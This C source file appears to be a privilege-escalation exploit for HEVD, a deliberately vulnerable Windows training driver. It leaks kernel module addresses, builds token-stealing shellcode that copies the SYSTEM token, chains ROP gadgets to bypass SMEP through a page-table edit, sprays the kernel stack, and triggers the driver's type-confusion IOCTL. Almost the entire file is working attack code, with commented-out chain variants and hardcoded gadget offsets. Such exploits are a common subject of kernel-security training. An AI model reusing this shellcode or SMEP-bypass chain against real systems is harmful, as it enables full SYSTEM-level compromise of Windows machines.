#include <stdio.h>
#include <Windows.h>
#include <sddl.h>
#include <Psapi.h>
#include <ntstatus.h>
#include "winternl.h"
#include "HEVD.h"

typedef struct _USER_TYPE_CONFUSION_OBJECT
{
    ULONG_PTR objectID;
    ULONG_PTR objectType;
} USER_TYPE_CONFUSION_OBJECT, * PUSER_TYPE_CONFUSION_OBJECT;


HANDLE driverHandle;
USER_TYPE_CONFUSION_OBJECT* userBuf;

ULONG64 vm3dmp_Addr = 0;
ULONG64 cng_Addr = 0;
ULONG64 acpi_Addr = 0;
ULONG64 ksecpkg_Addr = 0;
ULONG64 cidll_Addr = 0;
ULONG64 win32kfull_Addr = 0;


HMODULE hKernel = NULL;
ULONG64 KernelBase = NULL;
ULONG64 pMiGetPteAddress = NULL;
ULONG64 KUSER_SHARED_DATA = 0xFFFFF78000000000;
char* lpvShellcode;

char* dummyBuf = (char*)0xdeadbeef;
char* sprayArray;
_NtQuerySystemInformation NtQuerySystemInformation;
_NtMapUserPhysicalPages NtMapUserPhysicalPages;
_NtMapUserPhysicalPages NtMapUserPhysicalPagesScatter;
_MiGetPteAddress MiGetPteAddress;
ULONG64 PteBase = NULL;
RTL_PROCESS_MODULES ModuleInfo = { 0 };

char ShellCode[] =
"\x41\x50\x41\x51\x52\x51\x50"          // push r8, r9, rdx, rcx, rax
"\x65\x48\x8B\x14\x25\x88\x01\x00\x00"	// mov rdx, [gs:188h]		    ; Get _ETHREAD pointer from KPCR
"\x4C\x8B\x82\xB8\x00\x00\x00"		    // mov r8, [rdx + b8h]		    ; _EPROCESS (kd> u PsGetCurrentProcess)
"\x4D\x8B\x88\x48\x04\x00\x00"		    // mov r9, [r8 + 448h]		    ; ActiveProcessLinks list head
"\x49\x8B\x09"				            // mov rcx, [r9]		        ; Follow link to first process in list
//find_system_proc:
"\x48\x8B\x51\xF8"			            // mov rdx, [rcx - 8]		    ; Offset from ActiveProcessLinks to UniqueProcessId
"\x48\x83\xFA\x04"			            // cmp rdx, 4			        ; Process with ID 4 is System process
"\x74\x05"				                // jz found_system		        ; Found SYSTEM token
"\x48\x8B\x09"				            // mov rcx, [rcx]		        ; Follow _LIST_ENTRY Flink pointer
"\xEB\xF1"				                // jmp find_system_proc		    ; Loop
//found_system:
"\x48\x8B\x41\x70"			            // mov rax, [rcx + 70h]		    ; Offset from ActiveProcessLinks to Token
"\x24\xF0"				                // and al, 0f0h			        ; Clear low 4 bits of _EX_FAST_REF structure
"\x49\x89\x80\xB8\x04\x00\x00"		    // mov [r8 + 4b8h], rax		    ; Copy SYSTEM token to current process's token
//recover:
"\x58\x59\x5A\x41\x59\x41\x58"          // push rax, rcx, rdx, r9, r8
"\x48\x31\xF6"				            // xor rsi, rsi			        ; Zeroing out rsi register to avoid Crash
"\x48\x31\xFF"				            // xor rdi, rdi			        ; Zeroing out rdi register to avoid Crash
"\x48\x31\xC0"				            // xor rax, rax			        ; NTSTATUS Status = STATUS_SUCCESS
"\x48\x83\xc4\x28"			            // add rsp, 28h			        ; origin return address at HEVD!BufferOverflowStackIoctlHandler+0x1a
"\xc3"					                // ret				
;

void openDevice() {
    driverHandle = CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (driverHandle == INVALID_HANDLE_VALUE) {
        printf("\t[-] Could not open HEVD handle\n");
        exit(-1);
    }
}

void prepareShellcode() {
    lpvShellcode = (char*)VirtualAlloc(
        NULL,				        // Next page to commit
        0x1000,		                // Page size, in bytes
        MEM_COMMIT | MEM_RESERVE,	// Allocate a committed page
        PAGE_EXECUTE_READWRITE);	// Read/write access
    if (lpvShellcode == NULL) {
        printf("\t[-] Failed to create shellcode memory\n");
        exit(-1);
    }
    memset(lpvShellcode, 0x0, 0x1000);
    memcpy(lpvShellcode, ShellCode, sizeof(ShellCode));
}


typedef struct {
    ULONG64 XorRaxRax;
    ULONG64 MovRspR11; // restore rsp
    ULONG64 AddRsp0x98;
    ULONG64 AddRsp0x138;
    ULONG64 AddRsp0x158;
    ULONG64 AddRsp0x168;
    ULONG64 AddRsp0xc8;
    ULONG64 AddRsp0x78;
    ULONG64 AddRsp0x18;


    ULONG64 PopR12PopRcx;
    ULONG64 XorR11Rcx;
    ULONG64 SubRspVal;
    ULONG64 PopRcx;

} ROP, * PROP;

ROP RopGadget;
ULONG64 BypassSMEP[0x10] = { 0 };

void prepareRopGadget() {
    RopGadget.XorRaxRax = KernelBase + 0x3cd0da;
    RopGadget.MovRspR11 = KernelBase + 0x3e8208;
    RopGadget.AddRsp0x98 = KernelBase + 0x5ce24f; //cng_Addr + 0x172d
    RopGadget.AddRsp0x138 = KernelBase + 0x3f1ee3;
    RopGadget.AddRsp0x158 = acpi_Addr + 0x2c36b;
    RopGadget.AddRsp0x168 = cidll_Addr + 0x1fbf;
    RopGadget.AddRsp0x78 = KernelBase + 0x24260d;
    RopGadget.AddRsp0xc8 = KernelBase + 0x2d5f43;
    RopGadget.AddRsp0x18 = KernelBase + 0x239a9e;




    RopGadget.PopR12PopRcx = KernelBase + 0x2759f2;
    RopGadget.PopRcx = KernelBase + 0x2021a0;
    RopGadget.XorR11Rcx = cidll_Addr + 0xaf117;
    RopGadget.SubRspVal = 0x1f0;//0x1978;


}

void prepareBypassSMEP() {
    *(BypassSMEP + 0) = KernelBase + 0x2759f2;          // pop r12; pop rcx
    *(BypassSMEP + 1) = (ULONG64)lpvShellcode;          // shellcode addr
    *(BypassSMEP + 2) = KernelBase + 0x27af40;          // nt!MiGetPteAddress
    *(BypassSMEP + 3) = KernelBase + 0x216c22;          // pop rdx
    *(BypassSMEP + 4) = KUSER_SHARED_DATA + 0x800;      // KUSER_SHARED_DATA + 0x800
    *(BypassSMEP + 5) = KernelBase + 0x2fea29;          // mov [rdx], rax
        
    *(BypassSMEP + 6) = KernelBase + 0x216c22;          // pop rdx
    *(BypassSMEP + 7) = KUSER_SHARED_DATA + 0x800;      // KUSER_SHARED_DATA + 0x800
    *(BypassSMEP + 8) = KernelBase + 0x3a3fa7;          // mov rdx, [rdx]
    *(BypassSMEP + 9) = KernelBase + 0x2021a0;          // pop rcx
    *(BypassSMEP + 10) = 0xFFFFFFFFFFFFFFFB;            // 0x0FFFFFFFFFFFFFb
    *(BypassSMEP + 11) = ksecpkg_Addr + 0x1e635;        // and [rdx], rcx         
}

void prepareUserbuf() {
    userBuf = (USER_TYPE_CONFUSION_OBJECT*)VirtualAlloc(
        NULL,
        sizeof(USER_TYPE_CONFUSION_OBJECT),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);
    
    userBuf->objectID = (ULONG_PTR)0xdeadbeef;

    /* TypeConfusion->callback() */
    //userBuf->objectType = (ULONG_PTR)(KernelBase + 0x32bbca); // add rsp, 0xa8;
    //userBuf->objectType = (ULONG_PTR)(KernelBase + 0x27af40); // pMiGetPteAddress
    //userBuf->objectType = (ULONG_PTR)(vm3dmp_Addr + 0x2cbc); // push rsp ; pop rdx;
    //userBuf->objectType = (ULONG_PTR)(KernelBase + 0x2759f2); // pop r12; pop rcx; 
    //userBuf->objectType = (ULONG_PTR)(KernelBase + ); // sub r11b, r13b ;

    //userBuf->objectType = RopGadget.MovRspR11; // mov rsp, r11; 
    userBuf->objectType = RopGadget.AddRsp0x98;

}

void TriggerTypeConfusion() {
    bool ret = DeviceIoControl(driverHandle,          // Device to be queried
        HEVD_IOCTL_TYPE_CONFUSION,          // Operation to perform
        (LPVOID)userBuf, sizeof(userBuf),   // Input Buffer
        NULL, 0,                           // Output Buffer
        NULL, NULL                         // # Bytes returned, Synchronous I/O
    );

}



BOOLEAN GetKernelModuleBase(PCHAR Name, ULONG_PTR* lpBaseAddress) {
    PRTL_PROCESS_MODULES ModuleInformation = NULL;
    ULONG InformationSize = 16;
    NTSTATUS NtStatus;

    NtQuerySystemInformation = (_NtQuerySystemInformation)
        GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
    if (NtQuerySystemInformation == NULL) {
        exit(-1);
    }

    do {
        InformationSize *= 2;

        ModuleInformation = (PRTL_PROCESS_MODULES)realloc(ModuleInformation, InformationSize);
        memset(ModuleInformation, 0, InformationSize);

        NtStatus = NtQuerySystemInformation(SystemModuleInformation,
            ModuleInformation,
            InformationSize,
            NULL);
    } while (NtStatus == STATUS_INFO_LENGTH_MISMATCH);


    BOOL Success = FALSE;
    for (UINT i = 0; i < ModuleInformation->NumberOfModules; i++) {
        CONST PRTL_PROCESS_MODULE_INFORMATION Module = &ModuleInformation->Modules[i];
        CONST USHORT OffsetToFileName = Module->OffsetToFileName;
        *lpBaseAddress = (ULONG_PTR)ModuleInformation->Modules[i].ImageBase;

        if (!strcmp((const char*)&Module->FullPathName[OffsetToFileName], Name)) {
            Success = TRUE;
            break;
        }
    }

    free(ModuleInformation);
    return Success;
}

void getNtMapUserPhysicalPagesScatter() {
    NtMapUserPhysicalPagesScatter = (_NtMapUserPhysicalPages)
        GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtMapUserPhysicalPagesScatter");
    if (NtMapUserPhysicalPagesScatter == NULL) {
        exit(-1);
    }
}

void getNtMapUserPhysicalPages() {
    NtMapUserPhysicalPages = (_NtMapUserPhysicalPages)
        GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtMapUserPhysicalPages");
    if (NtMapUserPhysicalPages == NULL) {
        exit(-1);
    }
}
// Deliver a ROP chain via NtMapUserPhysicalPages

void KernelStackSpray() {
    sprayArray = (char*)VirtualAlloc(
        NULL,        
        0x1000,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);
    memset(sprayArray, 0x0, 0x1000);
    memset(sprayArray,         0x41, 0x1000);
    memset(sprayArray + 0xc80, 0x87, 0x1000 - 0xc80);
    memset(sprayArray + 0x520, 0xAA, 0x10); // stack: ...990

    /*
    memcpy(sprayArray + 0xd10, &RopGadget.PopR12PopRcx, 8);
    memcpy(sprayArray + 0xd20, &RopGadget.SubRspVal, 8);
    memcpy(sprayArray + 0xd28, &RopGadget.AddRsp0x138, 8);
    memcpy(sprayArray + 0xe68, &RopGadget.XorR11Rcx, 8);
    memcpy(sprayArray + 0xe70, &RopGadget.XorRaxRax, 8);
    memcpy(sprayArray + 0xe78, &RopGadget.MovRspR11, 8);
    */

    /*
    memcpy(sprayArray + 0xd20, &RopGadget.XorRaxRax, 8);
    memcpy(sprayArray + 0xd28, &RopGadget.AddRsp0x138, 8);
    memcpy(sprayArray + 0xe68, &RopGadget.PopRcx, 8);
    memcpy(sprayArray + 0xe70, &RopGadget.SubRspVal, 8);
    memcpy(sprayArray + 0xe78, &RopGadget.AddRsp0x78, 8);
    memcpy(sprayArray + 0xef8, &RopGadget.AddRsp0xc8, 8);
    memcpy(sprayArray + 0xfc8, &RopGadget.AddRsp0x18, 8);
    memcpy(sprayArray + 0xfe8, &RopGadget.XorR11Rcx, 8);
    memcpy(sprayArray + 0xff0, &RopGadget.XorRaxRax, 8);
    memcpy(sprayArray + 0xff8, &RopGadget.MovRspR11, 8);
    */

    memcpy(sprayArray + 0xd10, &RopGadget.XorRaxRax, 8);




    printf("[+] NtMapUserPhysicalPages param1: 0x%llx\n", dummyBuf);
    printf("[+] NtMapUserPhysicalPages param2: 0x%llx\n", 0x200);
    printf("[+] NtMapUserPhysicalPages param3: 0x%llx\n", sprayArray);


    NtMapUserPhysicalPages(dummyBuf, 0x200, (PULONG_PTR)sprayArray);
}

int main()
{
    GetKernelModuleBase((PCHAR)"ntoskrnl.exe", &KernelBase);
    GetKernelModuleBase((PCHAR)"cng.sys", &cng_Addr);
    GetKernelModuleBase((PCHAR)"vm3dmp.sys", &vm3dmp_Addr);
    GetKernelModuleBase((PCHAR)"ACPI.sys", &acpi_Addr);
    GetKernelModuleBase((PCHAR)"ksecpkg.sys", &ksecpkg_Addr);
    GetKernelModuleBase((PCHAR)"CI.dll", &cidll_Addr);
    GetKernelModuleBase((PCHAR)"win32kfull.sys", &win32kfull_Addr);


    printf("[+] ntoskrnl: %llx\n", KernelBase);
    printf("[+] vm3dmp: %llx\n", vm3dmp_Addr);
    printf("[+] cng: %llx\n", cng_Addr);
    printf("[+] ACPI: %llx\n", acpi_Addr);
    printf("[+] ksecpkg: %llx\n", ksecpkg_Addr);
    printf("[+] CI.dll: %llx\n", cidll_Addr);
    printf("[+] win32kfull: %llx\n", win32kfull_Addr);



    prepareShellcode();
    printf("[+] lpvShellcode: 0x%llx\n", lpvShellcode);

    printf("[*] Preparing SMEP Bypass ROP Chain\n");
    prepareBypassSMEP();
    prepareRopGadget();

    getNtMapUserPhysicalPages();
    printf("[+] NtMapUserPhysicalPages addr: 0x%llx\n", (ULONG64)NtMapUserPhysicalPages);
    getNtMapUserPhysicalPagesScatter();
    printf("[+] NtMapUserPhysicalPagesScatter addr: 0x%llx\n", (ULONG64)NtMapUserPhysicalPagesScatter);


    openDevice();
    prepareUserbuf();
    printf("[+] UserBuf address: 0x%p\n", userBuf);
    KernelStackSpray();
    TriggerTypeConfusion();
}

